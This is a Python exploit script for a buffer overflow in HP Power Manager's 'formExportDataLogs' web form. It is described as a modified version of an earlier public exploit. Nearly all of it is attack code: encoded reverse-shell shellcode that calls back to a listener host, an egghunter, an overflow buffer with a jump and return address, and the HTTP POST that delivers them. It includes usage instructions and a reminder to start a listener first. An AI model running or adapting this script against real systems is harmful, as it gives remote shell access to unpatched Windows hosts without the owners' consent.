#!/usr/bin/python
print """
###################################################################################################################################
## It is a version modified of the original exploit by Muhammad Haidari(https://raw.githubusercontent.com/Muhammd/HP-Power-Manager/master/hpm_exploit.py). 
## The modification includes a payload which allows to obtain a reverse shell to avoid to open ports in the ##Windows'target which the ## firewall's windows will be closed it.							##							
## Remenber to put a listener to listen to any response before to launch the exploit in the port properly!
##
##Vulnerability: HP Power Manager 'formExportDataLogs'    		             
## 											 	             
## Vulnerable Application: HP Power Manager	 	   		
## Tested on Windows 7 Ultimate N 7600 N 6.1		  	
##												
## Contact: n4xh4ck5@gmail.com				
## Website: www.github.com/n4xh4ck5										
##														
##//#################################################################################################################################
##
##
## 
##
## Usage: python hpm_exploit.py <Remote IP Address>
"""
import urllib
import os
import sys
import struct
import time
from socket import *

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80

#msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.120 LPORT=443  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
try:


	egg="b33fb33f"
	buf= egg
	#Change the below payload with your data (LHOST)
	buf += "\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
	buf += "\x76\x0e\x83\x8c\x8e\xba\x83\xee\xfc\xe2\xf4\x7f\x64"
	buf += "\x0c\xba\x83\x8c\xee\x33\x66\xbd\x4e\xde\x08\xdc\xbe"
	buf += "\x31\xd1\x80\x05\xe8\x97\x07\xfc\x92\x8c\x3b\xc4\x9c"
	buf += "\xb2\x73\x22\x86\xe2\xf0\x8c\x96\xa3\x4d\x41\xb7\x82"
	buf += "\x4b\x6c\x48\xd1\xdb\x05\xe8\x93\x07\xc4\x86\x08\xc0"
	buf += "\x9f\xc2\x60\xc4\x8f\x6b\xd2\x07\xd7\x9a\x82\x5f\x05"
	buf += "\xf3\x9b\x6f\xb4\xf3\x08\xb8\x05\xbb\x55\xbd\x71\x16"
	buf += "\x42\x43\x83\xbb\x44\xb4\x6e\xcf\x75\x8f\xf3\x42\xb8"
	buf += "\xf1\xaa\xcf\x67\xd4\x05\xe2\xa7\x8d\x5d\xdc\x08\x80"
	buf += "\xc5\x31\xdb\x90\x8f\x69\x08\x88\x05\xbb\x53\x05\xca"
	buf += "\x9e\xa7\xd7\xd5\xdb\xda\xd6\xdf\x45\x63\xd3\xd1\xe0"
	buf += "\x08\x9e\x65\x37\xde\xe4\xbd\x88\x83\x8c\xe6\xcd\xf0"
	buf += "\xbe\xd1\xee\xeb\xc0\xf9\x9c\x84\x73\x5b\x02\x13\x8d"
	buf += "\x8e\xba\xaa\x48\xda\xea\xeb\xa5\x0e\xd1\x83\x73\x5b"
	buf += "\xea\xd3\xdc\xde\xfa\xd3\xcc\xde\xd2\x69\x83\x51\x5a"
	buf += "\x7c\x59\x19\xd0\x86\xe4\x84\xb1\x83\xee\xe6\xb8\x83"
	buf += "\x8d\x35\x33\x65\xe6\x9e\xec\xd4\xe4\x17\x1f\xf7\xed"
	buf += "\x71\x6f\x06\x4c\xfa\xb6\x7c\xc2\x86\xcf\x6f\xe4\x7e"
	buf += "\x0f\x21\xda\x71\x6f\xeb\xef\xe3\xde\x83\x05\x6d\xed"
	buf += "\xd4\xdb\xbf\x4c\xe9\x9e\xd7\xec\x61\x71\xe8\x7d\xc7"
	buf += "\xa8\xb2\xbb\x82\x01\xca\x9e\x93\x4a\x8e\xfe\xd7\xdc"
	buf += "\xd8\xec\xd5\xca\xd8\xf4\xd5\xda\xdd\xec\xeb\xf5\x42"
	buf += "\x85\x05\x73\x5b\x33\x63\xc2\xd8\xfc\x7c\xbc\xe6\xb2"
	buf += "\x04\x91\xee\x45\x56\x37\x6e\xa7\xa9\x86\xe6\x1c\x16"
	buf += "\x31\x13\x45\x56\xb0\x88\xc6\x89\x0c\x75\x5a\xf6\x89"
	buf += "\x35\xfd\x90\xfe\xe1\xd0\x83\xdf\x71\x6f"



	#tools/exploit/egghunter.rb -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e b33f -v 'hunter'

	hunter =  ""
	hunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
	hunter += "\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x89\xd7"
	hunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

	buffer = "\x41" * (721 -len(hunter))
	buffer +="\x90"*30 + hunter
	buffer +="\xeb\xc2\x90\x90"           #JMP SHORT 0xC2 
	buffer += "\xd5\x74\x41" 	      #pop esi # pop ebx # ret 10 (DevManBE.exe)
	 

	content= "dataFormat=comma&exportto=file&fileName=%s" % urllib.quote_plus(buffer)
	content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

	payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
	payload += "Host: %s\r\n" % HOST
	payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
	payload += "Accept: %s\r\n" % buf
	payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
	payload += "Content-Type: application/x-www-form-urlencoded\r\n"
	payload += "Content-Length: %s\r\n\r\n" % len(content)
	payload += content

	s = socket(AF_INET, SOCK_STREAM)
	s.connect((HOST, PORT))
	print "[+] Payload Fired... She will be back in less than a min..."
	s.send(payload)
	print "[+] Give me 30 Sec!"
	time.sleep(30)
	s.close()

except Exception as e:

	print "It was wrong..." +str(e)